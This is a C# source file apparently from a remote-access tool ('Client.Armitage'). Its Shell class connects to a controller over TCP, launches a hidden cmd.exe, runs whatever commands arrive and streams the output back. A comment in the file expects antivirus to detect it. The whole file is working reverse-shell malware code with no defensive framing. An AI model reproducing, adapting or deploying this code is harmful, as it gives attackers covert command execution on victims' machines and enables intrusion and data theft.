using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Client.Armitage
{
    /*
     * I'm pretty sure this class is going to get detected by AV.
     */

    /// <summary>
    /// A class that listens commands from the controller.
    /// </summary>
    public static class Shell
    {
        private static string ApiIP = "127.0.0.1";

        private static ushort Port = 30000;

        private static Thread _reader;

        private static TcpClient _client;

        private static NetworkStream _stream;

        private static Process _shell;

        /// <summary>
        /// Starts listening for commands from the controller.
        /// </summary>
        public static void Start()
        {
            // start reading from remote endpoint
            IPAddress ip = IPAddress.Parse(ApiIP);

            _reader = new Thread(ContinuousReading);

            _reader.Start();
        }
        public static void ContinuousReading()
        {
            while (Utilities.Updater.Latest != null && Utilities.Updater.Latest.OpenShell)
            {

                try
                {
                    _client = new TcpClient();

                    _client.Connect(ApiIP, Port);

                    _stream = _client.GetStream();

                    _shell = CreateCMD();

                    _shell.OutputDataReceived += _shell_OutputDataReceived;

                    _shell.ErrorDataReceived += _shell_OutputDataReceived;

                    _shell.BeginOutputReadLine();
                }
                catch
                {
                    // what?
                }
                finally
                {
                    while (_client.Connected && _stream != null)
                    {
                        try
                        {
                            byte[] receivedBytes = new byte[_client.Available];

                            int byteCount = _stream.Read(receivedBytes, 0, receivedBytes.Length);

                            string commandString = Encoding.ASCII.GetString(receivedBytes);

                            Console.WriteLine("Received: " + commandString);

                            _shell.StandardInput.WriteLine(commandString);
                        }
                        catch (Exception ex) // got disconnected
                        {
                            try
                            {
                                // wait for new connection
                                _client.Close();

                                _stream.Close();
                            }
                            catch { }
                            break;
                        }
                    }
                }
                // wait for a new shell connection 
                Thread.Sleep(1000);
            }
        }

        private static void _shell_OutputDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (e.Data != null && _client.Connected && _stream != null)
            {
                var bytes = Encoding.ASCII.GetBytes(e.Data + Environment.NewLine);
                _stream.Write(bytes, 0, bytes.Length);
            }
        }

        private static Process CreateCMD()
        {

            // create cmd
            Process p = new Process();

            p.StartInfo.FileName = "cmd";

            p.StartInfo.CreateNoWindow = true;

            p.StartInfo.UseShellExecute = false;

            p.StartInfo.RedirectStandardOutput = true;

            p.StartInfo.RedirectStandardInput = true;

            p.StartInfo.RedirectStandardError = true;

            p.Start();

            p.BeginOutputReadLine();

            return p;
        }
    }
}
